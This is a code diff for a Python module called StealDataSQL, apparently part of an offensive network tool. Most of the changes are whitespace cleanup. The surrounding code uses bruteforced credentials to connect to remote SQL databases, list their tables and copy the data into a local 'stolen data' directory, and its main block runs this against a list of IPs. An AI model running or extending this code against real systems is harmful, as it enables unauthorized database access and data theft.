@@ -3,7 +3,7 @@ import pandas as pd
 import logging
 import time
 from sqlalchemy import create_engine
-from rich.console import Console
+# from rich.console import Console
 from threading import Timer
 from shared import SharedData
 from logger import Logger
@@ -56,8 +56,8 @@ class StealDataSQL:
                 logger.info("Table search interrupted due to orchestrator exit.")
                 return []
             query = """
-            SELECT TABLE_NAME, TABLE_SCHEMA 
-            FROM INFORMATION_SCHEMA.TABLES 
+            SELECT TABLE_NAME, TABLE_SCHEMA
+            FROM INFORMATION_SCHEMA.TABLES
             WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
             AND TABLE_TYPE = 'BASE TABLE'
             """
@@ -102,7 +102,7 @@ class StealDataSQL:
                     # Filtrer les credentials pour l'IP spécifique
                     ip_credentials = df[df['IP Address'] == ip]
                     # Créer des tuples (username, password, database)
-                    credentials = [(row['User'], row['Password'], row['Database']) 
+                    credentials = [(row['User'], row['Password'], row['Database'])
                                  for _, row in ip_credentials.iterrows()]
                     logger.info(f"Found {len(credentials)} credential combinations for {ip}")
 
@@ -132,7 +132,7 @@ class StealDataSQL:
                             mac = row['MAC Address']
                             local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
                             os.makedirs(local_dir, exist_ok=True)
-                            
+
                             if tables:
                                 for table, schema in tables:
                                     if self.stop_execution or self.shared_data.orchestrator_should_exit:
@@ -144,7 +144,7 @@ class StealDataSQL:
                                 success = True
                                 counttables = len(tables)
                                 logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
-                            
+
                             if success:
                                 timer.cancel()
                                 return 'success'
@@ -160,7 +160,7 @@ class StealDataSQL:
             else:
                 logger.info(f"Skipping {ip} as it was not successfully bruteforced")
                 return 'skipped'
-                
+
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
@@ -176,14 +176,14 @@ if __name__ == "__main__":
     try:
         steal_data_sql = StealDataSQL(shared_data)
         logger.info("[bold green]Starting SQL data extraction process[/bold green]")
-        
+
         # Load the IPs to process from shared data
         ips_to_process = shared_data.read_data()
-        
+
         # Execute data theft on each IP
         for row in ips_to_process:
             ip = row["IPs"]
             steal_data_sql.execute(ip, b_port, row, b_status)
-            
+
     except Exception as e:
         logger.error(f"Error in main execution: {e}")
